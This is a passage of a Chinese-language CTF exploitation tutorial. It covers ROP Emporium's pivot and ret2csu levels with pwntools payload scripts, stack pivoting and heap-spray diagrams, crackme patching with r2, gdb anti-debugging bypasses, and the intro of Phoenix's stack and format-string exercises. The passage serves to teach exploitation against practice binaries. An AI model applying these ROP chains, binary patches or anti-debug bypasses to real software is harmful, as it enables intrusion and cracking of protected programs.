        │ 控制 r14     │      │ xchg rax,r8│
        └──────┬──────┘      └─────┬──────┘
               │                   │ 需要
        ┌──────▼──────┐      ┌─────▼──────┐
        │pop r14;ret  │      │ 控制 r8     │
        │   ✔ 有！     │      └─────┬──────┘
        └─────────────┘            │
                             ┌─────▼──────┐
                             │pop r8;ret  │
                             │   ✔ 有！    │
                             └────────────┘
```

**这个方法为什么这么重要？** 因为真实世界的 Pwn 题目里，
"完美的 gadget"极其罕见，你几乎总是在**组合**。学会倒推，
你面对任何"这个寄存器控制不了"的问题，都有一套系统化的排查路径，
而不是盯着 `ROPgadget` 的输出发呆。

#### 3.6.4 常见坑

| 现象 | 病因 | 解法 |
|---|---|---|
| 找不到任何 `pop rax` | rax 常被用作中转，难有干净的 pop | 用 `xchg` / `mov rax, ...` 类 gadget 变通 |
| gadget 中途跑飞 | 你从指令**中间**开始执行了 | `ROPgadget` 给出的地址就是入口，别自己偏移 |
| 写完发现顺序反了 | 字节搬运方向搞错 | 每写一个字节，r14 都要 +1 |
| `bextr` 结果全是 0 | 控制字（长度/起点）算错 | 长度和起点各占 8 位，用 `(len<<8)|start` 验证 |

### 关卡 7：pivot

**目标**：栈上只够放**很小的 ROP 链**，但程序给了你一块**大内存**放链。你要**栈迁移**过去。

```bash
# 关键 gadget：xchg rsp, rax ; ret  /  leave ; ret  /  pop rsp ; ret
ROPgadget --binary pivot | grep -E "xchg|leave|pop rsp"
```

**思路**：

```python
from pwn import *
io = process('./pivot')
elf = ELF('./pivot')

# 1. 先调用 foothold_function() 让 GOT 表解析
# 2. 把大链写到目标地址
# 3. 用 xchg rax, rsp ; ret 迁移栈
payload  = p64(FOOTHOLD_PLT)
payload += p64(POP_RAX)
payload += p64(TARGET_ADDR)     # 大链所在地址
payload += p64(XCHG_RAX_RSP)    # 栈指针换过去
```

**知识点**：栈迁移（stack pivot）、堆喷概念。

#### 3.7.1 什么叫"栈迁移"？——把 RSP 搬到别处去

前面 6 关都假设"栈空间够用"。但现实是：**溢出点可能只给你 30–40 字节**，
一条完整的 ROP 链（尤其要泄露 libc、再 ret2libc）动辄上百字节，根本放不下。

于是思路一转：**既然栈空间不够，那就把"栈"本身搬到我空间充足的地方去。**

```
【迁移之前】
    小缓冲区（栈）                   大缓冲区（堆 / .bss / mmap 区）
  ┌──────────────────┐            ┌────────────────────────────────┐
  │ 只能放一条短链    │            │  空着，空间绰绰有余             │
  │ 40 字节           │            │  可以放几百字节的完整链          │
  └──────────────────┘            └────────────────────────────────┘
        ↑ RSP 在这里                      ↑ 目标：把 RSP 搬到这儿

【迁移之后】
  ┌──────────────────┐            ┌────────────────────────────────┐
  │ 已经被消费完了    │            │  ← RSP 现在在这里               │
  │                  │            │  整条长链由 ret 依次消费         │
  └──────────────────┘            └────────────────────────────────┘
```

**关键点：`ret` 只认 RSP。** 只要把 RSP 换成别的值，程序就会从新地址开始
"一格格吃指令"。所以栈迁移的本质是**一次对 RSP 的写入**。

#### 3.7.2 三种迁移 gadget，以及它们各自的坑

**① `xchg rsp, rax ; ret` —— pivot 关卡的主角**

```
xchg rsp, rax ; ret
      ↑    ↑
   RSP 和 RAX 互换

为什么好用？因为前面的操作刚好能控制 RAX：
  ① 调用 foothold_function() → 返回值落在 RAX（函数的返回地址/结果）
  ② 或者用 pop rax 直接塞
  ③ xchg → RSP 直接变成那个地址 ✔
```

```
执行前的推演：

   RAX = 0x7ffff7dd0000   （大缓冲区地址）
   RSP = 0x7ffffffee3a8   （小缓冲区）
        ↓ xchg rsp, rax
   RAX = 0x7ffffffee3a8   （原来栈的位置存进 RAX，不重要了）
   RSP = 0x7ffff7dd0000   （✨ 栈顶搬到了大缓冲区）
        ↓ ret（接下来这条 ret 从新栈顶取地址）
   跳到 [0x7ffff7dd0000] 指向的地方

关键提醒：新栈位置的头 8 字节，必须已经放好"下一条要执行的地址"！
        否则 ret 会跳到一个垃圾地址 → 段错误。
```

**② `leave ; ret` —— 最经典的迁移方式**

```
leave  = mov rsp, rbp ; pop rbp
                ↑           ↑
         RSP 直接跳到 RBP   再弹一次 RBP

于是：RBP 的值决定了 RSP 去哪。攻击者只要控制 RBP，就等于控制了 RSP。
```

```
   控制 RBP ──► leave ──► RSP = RBP ──► ret 从新位置取地址
```

**③ `pop rsp ; ret` —— 最直白，但很少见**

```
pop rsp ; ret    ; 直接从栈上弹一个值进 RSP
```

**为什么它罕见？** 因为编译器几乎不会生成 `pop rsp`（这么做会破坏栈平衡，
正常代码里毫无意义）。所以通常只能靠 `xchg` 或 `leave` 变通。

**三种 gadget 对照表：**

| gadget | 依赖哪个寄存器 | 出现频率 | 典型场景 |
|---|---|---|---|
| `xchg rsp, rax ; ret` | RAX（通常来自函数返回值） | 中 | 堆上/大缓冲区地址已知时 |
| `leave ; ret` | RBP | **极高** | 绝大多数栈迁移题 |
| `pop rsp ; ret` | 栈 | 极低 | 有就用，最省事 |

#### 3.7.3 为什么"堆喷"会在这关被提到

如果大缓冲区的地址你**不知道**（ASLR 开着，堆地址随机），那"迁移到哪"就成了问题。
**堆喷（heap spray）** 的思路是：**既然不知道具体地址，那就把一大片内存全部填成"同样的内容"**，
然后"闭着眼随便指一个大概率命中的地址"。

```
   堆区：
   ┌───────────────────────────────┐
   │ 相同 payload 重复 1000 次      │  地址 0x...1000
   │ 相同 payload 重复 1000 次      │  地址 0x...2000
   │ 相同 payload 重复 1000 次      │  地址 0x...3000  ← 我猜这里
   │ 相同 payload 重复 1000 次      │  地址 0x...4000
   │ 相同 payload 重复 1000 次      │  地址 0x...5000
   └───────────────────────────────┘
   → 随便跳进这片区域（通常是 NOP sled + payload）
     落点几乎一定落在某份 payload 的某个位置 → 大概率能跑通
```

```
经典堆喷结构：

   ┌──────────────────────────────────────────┐
   │ NOP NOP NOP NOP ... （滑板，落点偏了也能滑到目标）│
   ├──────────────────────────────────────────┤
   │ 真正的 payload（ROP 链 / shellcode）       │
   ├──────────────────────────────────────────┤
   │ 重复、重复、一直重复到填满整个地址空间       │
   └──────────────────────────────────────────┘
```

**注意区分三个容易混的词：**

| 术语 | 做什么 | 主要用在 |
|---|---|---|
| **栈迁移 (stack pivot)** | 把 RSP 换到别处，让 ROP 链在新位置执行 | ROP、栈溢出空间不足 |
| **堆喷 (heap spray)** | 大量重复填充，提高"盲跳"命中率 | 浏览器漏洞、堆地址不可知 |
| **NOP sled** | 一串无操作指令，让落点"滑"到真正 payload | shellcode、盲跳 |

#### 3.7.4 pivot 关卡的执行推演

```
① 第一次溢出（只够放一小段）：
   ┌───────────────────────────────┐
   │ foothold_function@plt         │ ← 让它先执行，顺便让 GOT 解析
   ├───────────────────────────────┤
   │ main（回到 main 再读一次输入）  │
   └───────────────────────────────┘

② 第二次输入把"完整大链"写到程序给的大缓冲区里

③ 再次溢出，这次用短链把 RSP 搬过去：
   ┌───────────────────────────────┐
   │ pop rax ; ret                 │
   ├───────────────────────────────┤
   │ 大缓冲区的地址                 │ → RAX = 大缓冲区
   ├───────────────────────────────┤
   │ xchg rsp, rax ; ret           │ → RSP = 大缓冲区
   └───────────────────────────────┘
                 ↓
④ 现在 ret 开始消费大缓冲区里那些内容 → 完整长链顺畅执行 ✔
```

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| 迁移后立刻崩 | 新栈位置头 8 字节不是合法地址 | 确保 [TARGET_ADDR] 头 8 字节是你链的第一格 |
| 崩在 `xchg` 前的 `ret` | RAX 不是你以为的值 | gdb 断下来 `info registers rax` 确认 |
| `leave; ret` 迁移失败 | RBP 没控制住 | 断在 `leave` 前看 RBP |
| 大缓冲区偏移算错 | 地址写错了（高低位抄反） | 用 `p64()` 并核对 `x/8xg` |
| 迁移成功但链只跑了一半 | 新栈空间不够/被别的数据污染 | 换更靠后的地址，或干脆迁移到 `.bss` |

### 关卡 8：ret2csu

**目标**：没有 `pop rdx` 这类 gadget，要用 `__libc_csu_init` 里的通用 gadget 来设置寄存器。

**目标调用**：`ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

```python
from pwn import *
io = process('./ret2csu')
elf = ELF('./ret2csu')

# __libc_csu_init 里的两个经典 gadget
CSU_POP = 0x40089a      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x400880     # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

payload  = b'A' * 40
payload += p64(CSU_POP)
payload += p64(0)                    # rbx
payload += p64(1)                    # rbp
payload += p64(elf.got['ret2win'])   # r12 → 但这里要指向函数指针
payload += p64(0xcafebabecafebabe)   # r13 → rsi
payload += p64(0xd00df00dd00df00d)   # r14 → rdx
payload += p64(elf.got['__libc_csu_init'] + 9)  # r15 → 调用目标
payload += p64(CSU_CALL)
payload += p64(0) * 7                # 填 padding
payload += p64(POP_RDI) + p64(0xdeadbeefdeadbeef)
payload += p64(elf.plt['ret2win'])
```

**知识点**：ret2csu 通用 gadget、寄存器传递限制。

#### 3.8.1 `__libc_csu_init` 是什么，为什么会"白送"一堆 gadget

这是个**每个动态链接的 C 程序都有**的函数（较新的 glibc 里改名叫 `__libc_start_call_main`
相关逻辑，但老的 ELF 里它一直在）。它的职责很枯燥：**在 `main` 之前，
把 `.init_array` 里登记的一批初始化函数挨个调用一遍。**

**为了"挨个调用一组函数指针"，编译器必须写出这样的代码：**

```
它要读出数组里的函数指针 → 需要一个"基址 + 索引 * 8"的寻址
它要传参给每个函数      → 需要把 rdi/rsi/rdx 从别的寄存器搬过去
它要循环                → 需要计数器、比较、跳转

于是你就有了一堆"设置寄存器 + 调用间接地址"的现成指令。
```

**为什么这些指令能当 gadget？** 因为它们**不是给你用的，但形态正好合适**——
既包含 `mov rdx, r14` / `mov rsi, r13` / `mov edi, r12d` 这类"搬运"，
又包含 `call [r15 + rbx*8]` 这类"间接调用"，而且它们之间的地址关系固定。
一旦你从**指令中间**切进去执行，就得到了一条可控的链。

```
__libc_csu_init 的大致布局（概念版）：

  ...                                  ← 从中间切进来就从这里开始
  ┌─────────────────────────────────────────────────────┐
  │ mov rdx, r14                                        │
  │ mov rsi, r13          ← "搬运 gadget"               │
  │ mov edi, r12d         ← 把 r12/r13/r14 搬进参数寄存器 │
  │ call qword [r15 + rbx*8]  ← 间接调用 r15 指向的函数   │
  └─────────────────────────────────────────────────────┘
  ...
  ┌─────────────────────────────────────────────────────┐
  │ add rbx, 1            ← 循环计数                     │
  │ cmp rbx, rbp          ← 和 rbp 比较                  │
  │ jne ...               ← 不等就跳回去继续             │
  │ pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15 │
  │ ret                   ← "弹数 gadget"（一次弹 6 个）  │
  └─────────────────────────────────────────────────────┘
```

**注意：`call [r15 + rbx*8]` 是"间接调用"——它调用的地址由 r15 和 rbx 算出来。**
这就是为什么 payload 里要放 `r15 = 某个指向函数指针的地址`、`rbx = 0`：
`r15 + 0*8 = r15`，等于直接调用 r15 指向的那个函数指针。

#### 3.8.2 为什么必须"绕这么一大圈"

回到核心痛点：**这一关的目标函数需要三个参数，但程序里没有 `pop rdx`。**

```
registers 需要的：
   RDI ← 0xdeadbeefdeadbeef
   RSI ← 0xcafebabecafebabe
   RDX ← 0xd00df00dd00df00d   ← ✘ 没有 pop rdx！

标准 ROP 找法全部失败：
   ROPgadget --binary ret2csu | grep "pop rdi"   ✔ 有
   ROPgadget --binary ret2csu | grep "pop rsi"   ✔ 有
   ROPgadget --binary ret2csu | grep "pop rdx"   ✘ 空！
```

**这就是 ret2csu 的动机：找一条"能把 r14 搬到 rdx"的通用路径。**
而 `__libc_csu_init` 正好提供了它。

**两条 gadget 的分工（对照表）：**

| gadget | 指令序列 | 干什么用 |
|---|---|---|
| **CSU_POP** | `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` | **装弹**：一次性给 6 个寄存器赋值 |
| **CSU_CALL** | `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]` | **开火**：把值搬进参数寄存器并调用 |

```
流程：

[CSU_POP]
   pop rbx ← 0            （索引，固定 0）
   pop rbp ← 1            （cmp 用，避免循环）
   pop r12 ← 参数1的替代   （→ 会进 edi/rsi 相关的搬运）
   pop r13 ← 参数2         （→ 会进 rsi）
   pop r14 ← 参数3         （→ 会进 rdx）✨ 关键
   pop r15 ← 调用目标地址
   ret
        ↓
[CSU_CALL]
   mov rdx, r14    ← 参数3 就位
   mov rsi, r13    ← 参数2 就位
   mov edi, r12d   ← 参数1 就位
   call [r15+rbx*8]  ← 调用！
```

**注意 `edi` 只用了 32 位（`r12d`）**——这是这个 gadget 的**先天缺陷**：
参数 1 会被截断到 32 位。所以原始代码里"参数 1 用 `pop rdi` 单独设置"，
把 64 位的 `0xdeadbeefdeadbeef` 完整塞进去。这个"高 32 位丢失"的坑，
是 ret2csu 最著名的坑之一。

#### 3.8.3 那"`p64(0) * 7` 填 padding"是怎么回事

```python
payload += p64(CSU_CALL)
payload += p64(0) * 7                # 填 padding
```

**为什么要有这 7 格？** 因为 `CSU_CALL` 里的 `call` 执行完之后，
**被调用函数的 `ret` 会从栈上取地址**。而此刻 RSP 指向哪里？
它指向你 `CSU_CALL` 后面紧接着的那一格。所以：

```
┌──────────────────────┬───────────────────┬──────────────────────┐
│ CSU_CALL             │ ← RSP 在 call 前   │ 被调用函数的返回地址  │
├──────────────────────┼───────────────────┼──────────────────────┤
│ p64(0)  #1           │ ← 这是被调用函数   │                      │
│ p64(0)  #2           │   返回时会跳到的    │                      │
│   ...                │   地方 → 得让它    │                      │
│ p64(0)  #7           │   落在"安全位置"   │                      │
├──────────────────────┼───────────────────┼──────────────────────┤
│ POP_RDI + 参数1       │ ← 这里才是我们想   │                      │
│ ret2win@plt          │   继续执行的链      │                      │
└──────────────────────┴───────────────────┴──────────────────────┘
```

**说到底，"7 格 padding"是在给 `__libc_csu_init` 剩下的循环逻辑当垫脚石**——
在内存里画出来是这样的：

```
      栈（低 → 高）
┌──────────┬──────────┬──────────┬──────────┬──────────┐
│ CSU_POP  │ rbx=0    │ rbp=1    │ r12      │ r13      │
├──────────┼──────────┼──────────┴──────────┴──────────┤
│ r14      │ r15      │ CSU_CALL │ 0 0 0 0 0 0 0        │
├──────────┴──────────┴──────────┼──────────────────────┤
│      （7 格 padding）            │ POP_RDI │ 参数1      │
├─────────────────────────────────┼─────────┴────────────┤
│ ret2win@plt                     │                      │
└─────────────────────────────────┴──────────────────────┘
```

```
一步步执行：
  ① 函数结尾 ret → 跳到 CSU_POP
  ② CSU_POP 弹 6 次 → rbx/rbp/r12/r13/r14/r15 全部就位，RSP 指向 CSU_CALL
  ③ ret → 跳到 CSU_CALL
  ④ CSU_CALL 把 r14→rdx、r13→rsi、r12d→edi，然后 call [r15+0]
                    ↓
  ⑤ 被调用的函数执行完，它的 ret 从栈上取到第 1 个 p64(0)
                    ↓
      → 跳到 0（或者一个无害地址），继续"吃"后面 6 个 0
                    ↓
  ⑥ 7 格垫脚石走完 → 终于轮到 POP_RDI + 参数1
                    ↓
  ⑦ 设好 RDI 后 ret → 进入 ret2win@plt ✨ 大功告成
```

**等一下——为什么这里可以"先调用一次然后继续跑"？** 因为 `CSU_CALL` 调用的那个函数
（`r15` 指向的）**返回之后**，执行流还在栈上继续走。这正是 ROP 的精髓：
**"调用"只是 RSP 的一次临时借用，函数返回后链子接着往下跑。**

#### 3.8.4 概念对比：ROP 家族里的几个"堂兄弟"

| 技术 | 前提 | 本质 | 典型场景 |
|---|---|---|---|
| **ret2win** | 有现成 win 函数 | 直接改返回地址 | 最简入门题 |
| **ret2plt** | 有需要的函数在 PLT 里 | 跳到 `func@plt` | split 关卡 |
| **ret2libc** | 能泄露 libc 地址 | 算 libc 基址后调 libc 函数 | 有 PIE/无现成 PLT |
| **ret2csu** | 有 `__libc_csu_init` | 用通用 gadget 设置寄存器 | 缺 `pop rdx` 之类 |
| **ret2dlresolve** | 能伪造 `.rela.plt` 结构 | 骗动态链接器去解析你指定的符号 | 无任何需要的 PLT/GOT |
| **ROP（统称）** | 有任意 gadget | 用现有代码拼出行为 | 所有 NX 场景的通用解 |
| **JOP** | 有间接跳转 gadget | 用 `jmp` 而非 `ret` 串链 | 某些 `ret` 被保护的场合 |
| **SROP** | 能触发 `sigreturn` | 一次系统调用设置所有寄存器 | gadget 极度匮乏时 |

**这几种最容易混的三组辨析：**

| 对比 | 区别要点 |
|---|---|
| **ret2libc vs ROP** | ret2libc 是"调库函数"这一种特例；ROP 是"用 gadget 拼任意逻辑"的通用方法。ret2libc 是 ROP 的一个用法。 |
| **ret2csu vs ret2libc** | ret2csu 解决"**参数怎么设**"的问题；ret2libc 解决"**调哪个函数**"的问题。两者常常一起用。 |
| **canary vs PIE** | canary 保护的是"**栈上的返回地址不被悄悄改**"；PIE 保护的是"**你不知道代码地址在哪**"。一个是数据完整性，一个是地址保密性。 |
| **NX vs RELRO** | NX 管"**内存能不能执行**"；RELRO 管"**GOT 能不能写**"。 | 
| **ASLR vs PIE** | ASLR 是**系统级**随机化（栈/堆/libc）；PIE 是**程序自身**的编译选项（代码段随机化）。PIE 需要 ASLR 支持才生效。 |

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| 参数 1 变成 `0xdeadbeef`（高位丢了） | `mov edi, r12d` 只有 32 位 | 用 `pop rdi` 单独设置完整 64 位参数 |
| 崩在 `call [r15+rbx*8]` | r15 指向的不是合法函数指针 | 确认 r15 是"存函数地址的地方"而非函数本身 |
| padding 数目不对 | 少了/多了 8 字节 | 断在 `CSU_CALL` 后用 `x/20xg $rsp` 数格子 |
| 调用了错误的函数 | rbx 不是 0，索引偏移 | rbx 必须是 0，rbp 设成 1 避免循环 |
| 程序调用完就退出 | 链走完没有可执行的下一步 | 链尾通常补一个 `main` 地址形成循环，或直接交互 |
| 换了 glibc 版本就没有这个 gadget | 新版 glibc 里 `__libc_csu_init` 被改掉了 | 换用 `__libc_start_main` 相关 gadget，或找别的通用 gadget |

### 3.9 8 关串起来看：能力是怎么一层层叠加的

这 8 关不是 8 个独立知识点，而是**一条能力升级链**。每一关补上前一关缺的那一环：

```
第 1 关  ret2win    →  我能控制 RIP 吗？            （有了"控制流劫持"）
                          ↓ 但目标函数要参数，我改不了参数
第 2 关  split      →  我能控制 RDI 吗？            （有了"设置参数"）
                          ↓ 但有三个函数要连着调，寄存器会被破坏
第 3 关  callme     →  我能连成链吗？对齐怎么办？    （有了"多段链 + 对齐纪律"）
                          ↓ 但需要的字符串程序里没有
第 4 关  write4     →  我能往内存写数据吗？          （有了"任意写"）
                          ↓ 但写进去的字节会被过滤
第 5 关  badchars   →  我能写进"坏字节"吗？          （有了"编码 + 自解码"）
                          ↓ 但有些寄存器根本没有 pop gadget
第 6 关  fluff      →  我能用冷门指令凑出工具吗？    （有了"gadget 组合能力"）

第 7 关  pivot      →  我能换一个地方继续执行吗？    （有了"栈迁移"）
                          ↓ 但 rdx 这种寄存器还是没人管
第 8 关  ret2csu    →  我能用通用 gadget 兜底吗？    （有了"终极兜底方案"）
```

**把它们画成一张"能力树"：**

```
                    ┌──────────────┐
                    │ 控制 RIP     │  ← 一切的起点
                    └──────┬───────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
   ┌────▼────┐      ┌──────▼──────┐     ┌─────▼─────┐
   │控制寄存器│      │  控制内存    │     │ 控制 RSP  │
   │(参数传递)│      │  (写数据)   │     │ (栈迁移)  │
   └────┬────┘      └──────┬──────┘     └─────┬─────┘
        │                  │                  │
   pop rdi/rsi/rdx     write gadget       xchg/leave
   不够 → ret2csu       坏字节 → XOR编码    空间不够 → pivot
```

**一个实用的判断流程（遇到新题目照着走）：**

```
① checksec 看保护
        │
        ├─ 有 canary？ → 先想"怎么泄露 canary"
        ├─ 有 PIE？    → 先想"怎么泄露一个地址"
        └─ 有 NX？     → 只能 ROP（没有就考虑 shellcode）
        │
        ▼
② 找"目标"：程序里有没有现成的 win / system / flag 相关字符串？
        │
        ├─ 有 → ret2win / ret2plt（关卡 1、2）
        └─ 没有 → 需要自己造字符串（关卡 4、5）
        │
        ▼
③ 数 gadget：需要哪些寄存器？有多少现成 pop？
        │
        ├─ 够 → 直接拼链（关卡 2、3）
        └─ 缺 → 组合指令（关卡 6）或用 ret2csu（关卡 8）
        │
        ▼
④ 数空间：栈上放得下整条链吗？
        │
        ├─ 放得下 → 完事
        └─ 放不下 → 栈迁移（关卡 7）
```

**这套流程的价值：** 以后遇到任何栈溢出题目，你都是先**诊断**再**开方**，
而不是"照着 writeup 抄 payload 然后祈祷"。

#### 4.1.1 逆向到底在"逆"什么？——把编译的每一步倒着走一遍

逆向之所以让人发懵，是因为你面对的是**编译器处理过的产物**，
中间的信息被层层剥掉了。把这四步想清楚，你就知道自己在找什么：

```
编译器干了四件事：

  ① 预处理        源码 → 展开宏、包含头文件
  ② 编译          变成汇编（这一步还保留结构，最容易读）
  ③ 汇编          汇编 → 机器码（助记符没了，只剩字节）
  ④ 链接          机器码 → 加上库函数、重定位 → 最终 ELF

你要倒着走：

  ELF ──► 反汇编（拿到助记符）──► 反编译（拿到类 C 代码）──► 读懂逻辑

  ① 先看"是什么"：file / checksec / strings
  ② 再看"结构"：有哪些函数（afl）、什么在调什么（axt）
  ③ 再读"细节"：某个函数内部怎么算（pdf @ main）
  ④ 最后"绕过"：改数据 / 改跳转 / 算 key
```

**关键认识：反编译的伪代码是"猜"出来的，不一定准。** 变量名被抹掉了、
类型可能猜错、内联的函数会被摊平。所以**伪代码看逻辑、汇编看细节**——
读不准的时候，一定要回头核对汇编。

#### 4.1.2 读汇编的"三步走"（零基础也能上手的办法）

老手看汇编是扫一眼就懂的，那是肌肉记忆。给初学者一个可以照做的步骤：

**第一步：认三个固定套路（认出来就等于读懂了框架）**

```
【函数开头】prologue —— 见到它就说明"新函数从这里开始"
   push rbp              （或 push rbp; mov rbp,rsp）
   mov  rbp, rsp
   sub  rsp, 0x??        ← 0x?? 就是局部变量的总大小

【函数结尾】epilogue —— 见到它就说明"这个函数要返回了"
   leave                 （或 mov rsp,rbp; pop rbp）
   ret

【函数调用】
   mov  rdi, [参数1]     ← 第 1 个参数（永远先看这行）
   mov  rsi, [参数2]     ← 第 2 个参数
   call 某个函数
   mov  [存哪], rax      ← rax 是返回值
```

**第二步：认几个高频指令的含义（不用背全，够用就行）**

| 指令 | 白话翻译 | 逆向时关注什么 |
|---|---|---|
| `mov a, b` | a = b | 数据从哪来、到哪去 |
| `lea a, [b+c]` | a = b 的地址 + c（**取地址，不是取值**） | 常用来取字符串/数组的地址 |
| `cmp a, b` | 比较 a 和 b | 后面紧跟 `je`/`jne` 就是"**判断点**" |
| `je / jz` | 相等就跳 | 校验失败的那条分支 |
| `jne / jnz` | 不等就跳 | 校验通过的那条分支 |
| `test a, a` | 看 a 是不是 0 | 常跟 `jz` 搭配判断"空不空" |
| `xor a, a` | a 清零（自己异或自己 = 0） | 编译器常用的"置零"手法 |
| `shl / shr` | 左移 / 右移 | 是 `*2` 和 `/2` 的优化版 |
| `imul / idiv` | 乘法 / 除法 | 手算逆运算时的关键 |
| `call` | 调函数 | 顺着跳进关键校验函数 |

**第三步：找"那个 if"——把判断点和字符串对上**

以明文比较的 crackme 为例，最典型的形态长这样：

```asm
lea    rdi, [rip+0x2004]     ; rdi = 用户输入
lea    rsi, [rip+0x2008]     ; rsi = "s3cr3t"（程序的正确口令）
call   strcmp                ; 比较
test   eax, eax              ; 结果是不是 0？
jne    label_fail            ; 不是 0（不相等）→ 跳去"错误"分支
                               ; 是 0（相等）→ 继续走"成功"

label_fail:
   lea rdi, [rip+0x...]      ; "Wrong!"
   call puts
   ...
```

**读法**：`cmp`/`test` 之后那个 `jne` 就是**判定点**。
想知道跳过哪个分支会发生什么？两种办法：

```
办法 A（静态）：看两条分支各自去哪，哪个打印"正确"就往哪走
办法 B（动态）：gdb 里把断点下在 jne 那一行，看 EAX 的值，
               然后手动把 ZF（零标志）翻过来 → 让程序走"成功"分支
```

#### 4.1.3 从"看懂"到"提交"：三种破题姿势

| 姿势 | 做什么 | 适用 | 优缺点 |
|---|---|---|---|
| **算 key** | 逆推算法，写出能生成正确输入的程序（keygen） | 算法可逆、题目要求提交"序列号" | 最正统，最能学到东西 |
| **patch** | 直接改二进制，把"失败分支"改成"永不跳转" | 任何有明确判断点的题 | 最快，但学不到算法 |
| **动态跟随** | gdb 里一路单步，直接读出寄存器里的答案 | 算法复杂但状态可见 | 有时候比静态快得多 |

**patch 的最小操作（概念版，用 r2）：**

```bash
r2 -w ./challenge          # -w 表示可写模式
  > aaa                    # 分析
  > pdf @ main             # 找到那个 jne 的地址，比如 0x1234
  > s 0x1234               # 跳到那一行
  > wa nop                 # 把这条跳转改成 nop（什么都不做）
  > wq                     # 保存退出
# 结果：无论比较结果如何，都"不跳"，也就是不走向失败分支
```

**为什么把 `jne` 改成 `nop` 就通了？** 因为 `jne` 是"条件跳转"：
满足条件才跳。把它换成 `nop`（空指令），跳转就永远不会发生，
程序只能顺着往下走去"成功"分支。

**这条思路的通用形态（记住这个"三选一"）：**

```
原始：  jne fail        ; 不等 → 失败
方案1：  nop            ; 永不跳 → 永远成功  ✔ 最常用
方案2：  jmp ok         ; 直接跳到成功分支
方案3：  test 改成全 0  ; 让条件本身不成立
```

#### 4.1.4 反调试的原理与破除思路

crackme 里常提到的"反调试"，原理其实非常朴素：**程序主动去检查"我是不是被人调试着"**，
一旦发现有调试器就故意走错分支/直接退出。常见的检查点：

| 检查手段 | 原理 | 表现 |
|---|---|---|
| `ptrace(PTRACE_TRACEME)` | 一个进程只能被一个调试器跟踪；先自己占住这个名额，gdb 就挂不上了 | gdb 里 `run` 直接退出，什么都不打印 |
| 读 `/proc/self/status` 的 `TracerPid` | 有调试器时这个值非 0 | 打印"检测到调试"之类 |
| 看运行时间 | 单步调试会让人均速度慢几百倍 | 到某处判断"超时"就退出 |
| `int3` 陷阱信号 | 埋 `\xcc` 看信号被谁吃掉 | 调试器下行为异常 |
| 检查 `/proc/self/maps` | 看有没有调试库映射进来 | 走错分支 |

**破除的标准思路（不需要写复杂脚本）：**

```
① gdb 里先断在反调试检查处（比如 main 开头附近）
② 找到那个判断后的跳转，把条件改掉 / 直接把函数返回值改成 0
③ 或者用 gdb 的 hook 跳过：
      (gdb) catch syscall ptrace      ← 拦下 ptrace 调用
      (gdb) commands
      > set $rax = 0                  ← 假装成功，返回 0
      > continue
      > end
```

**关键认识：反调试不是"不可破"，它只是"多一道门"。**
因为在 gdb 里你能停在任何时刻、改任何数据——只要能停住。
唯一让它棘手的是"你还没反应过来程序就退出了"，所以常用的手法是
**把退出点断掉**（`catch exit` / 断在 `exit@plt`），先把程序留住。

#### 4.1.5 crackme 常见坑与报错

| 现象 | 病因 | 解法 |
|---|---|---|
| `Permission denied` 跑不起来 | 二进制没有执行位 | `chmod +x ./challenge` |
| `cannot execute binary file` | 架构不对（ARM/MIPS 的题） | `file` 看架构，换 qemu 或换题 |
| `error while loading shared libraries` | 缺动态库（题目依赖特定 libc） | 装缺的库，或整题放到对应镜像里跑 |
| `strings` 只看到一堆乱码 | 字符串被混淆/加密了 | 转向动态调试，运行时看内存 |
| 反编译出来全是不认识的符号 | 被加壳或 strip 过 | `file`/`rabin2 -I` 看是否 packed，先脱壳 |
| `r2` 里 `pdf @ main` 说没有 main | strip 掉了符号 | `afl` 找 `entry0`，或 `aaa` 后按字符串交叉引用定位 |
| keygen 算出来的 key 不对 | 字节序/位运算搞反（`^` 和 `+`、大小端） | 拿小样本手算验证，再写脚本 |
| 输入正确但程序仍说错误 | 有隐藏校验（长度、结尾字节、二次校验） | 单步跟完整个校验流程，别提前下结论 |

./stack-zero
# 目标：修改变量值让它打印 "you have changed the 'modified' variable"

#### 4.2.1 为什么这套题要按"系列"排——每一档都在拆一层保护

Phoenix 的价值在于它**把 Pwn 的攻击面按难度切成了几个系列**，
你在每一档学的都是"打穿一类完全不同的机制"：

```
Stack 系列     →  数据溢出（把相邻变量/返回地址踩坏）
   Zero → One → Two → Three → Four → Five → Six
   ↑单纯改变量      ↑改返回地址   ↑shellcode  ↑格式化字符串  ↑更难
   
Format 系列    →  格式化字符串（不溢出，但能读/写任意内存）
Heap 系列      →  堆的内存管理被玩坏（UAF / 双重释放）
Net 系列       →  同样的漏洞，但从网络上打（模拟真实场景）
Final 系列     →  综合，防护更全
```

**Stack Zero 到底在干什么？** 它是"不涉及返回地址"的最纯粹版本：

```c
// 概念版源码
char buffer[64];
int modified = 0;              // ← 这个变量是目标

fgets(buffer, sizeof(buffer), stdin);
// 注意：如果这行写成 gets(buffer)，就溢出到 modified 了

if (modified != 0)
    printf("you have changed the 'modified' variable\n");
```

```
栈上布局（概念）：

  ┌──────────────┬──────────────┐
  │ buffer[64]   │ modified (int)│
  └──────────────┴──────────────┘
      ↑ 我们输入      ↑ 多想改这里，就往 buffer 里多写几个字节

  输入 64 字节 = 刚好填满 buffer，modified 还是 0
  输入 65+ 字节 = 第 65 个字节落到 modified 上 → 它不再是 0
                  → 程序打印"你改变了 modified" ✔
```

**为什么这一关"最基础"？** 因为它不涉及 `OVERFLOW`（还够不到返回地址），
只让你体会"**多写一个字节就足够改变程序行为**"这件事。
理解了这个，把目标换成返回地址就是第 1 关做的事情了。

**Format 系列为什么单独成系列？** 因为格式化字符串是**完全不同的打洞方式**：
你不需要写超长输入，只需要**让程序把用户输入当格式串用**：

```c
char buf[64];
fgets(buf, 64, stdin);
printf(buf);      // ✘ 直接把用户输入当格式串 → 灾难
```

```
攻击者输入 "%p %p %p %p" 时发生了什么？

  printf 期待"有对应参数"，但你没给参数
        ↓
  它就按调用约定去寄存器/栈里"取"参数
        ↓
